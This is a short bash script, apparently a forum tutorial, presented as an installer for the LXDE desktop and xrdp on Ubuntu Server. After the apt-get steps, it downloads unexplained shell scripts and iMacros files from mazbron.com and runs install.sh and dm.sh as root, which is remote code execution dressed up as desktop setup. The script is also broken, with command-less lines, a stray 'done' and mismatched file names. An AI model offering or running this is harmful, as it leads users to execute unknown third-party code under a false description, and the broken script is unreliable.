# By dustinhtc123 http://thebot.net/members/dustinhtc123.248128/
# How To Install LXDE Desktop Environment on Ubuntu Server
# Tut By https://bestseotool.co
echo Updating and upgrading your System..

apt-get update
sleep 2
echo Installing desktop #(xrdp)
sleep 3
apt-get install xorg xrdp lxde -y
sleep 5

echo Removing Screensaver
apt-get remove xscreensaver -y
sleep 2

wget mazbron.com/dm2.sh
wget mazbron.com/install.sh
wget mazbron.com/Oto.iim
wget mazbron.com/ns.txt
wget mazbron.com/url.txt
mkdir iMacros
cd iMacros
mkdir Macros
mkdir Datasources
Oto.iim iMacros/Macros
url.txt iMacros/Datasources
chmod +x dm2.sh install.sh
./install.sh
sleep 5
./dm.sh
done
echo You have successfully Installed LXDE Desktop Environment.. Enjoy..!!
echo cheers MAZBRON.com
